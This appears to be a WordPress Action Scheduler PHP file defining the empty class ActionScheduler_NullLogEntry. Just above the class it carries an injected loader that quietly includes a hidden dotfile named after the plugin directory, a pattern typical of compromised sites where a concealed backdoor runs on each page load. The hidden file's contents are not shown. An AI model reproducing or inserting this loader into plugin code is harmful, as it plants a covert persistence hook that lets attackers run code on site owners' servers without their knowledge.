<?php

/**
 * Class ActionScheduler_NullLogEntry
 */
if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class ActionScheduler_NullLogEntry extends ActionScheduler_LogEntry {
	public function __construct( $action_id = '', $message = '' ) {
		// nothing to see here
	}
}
 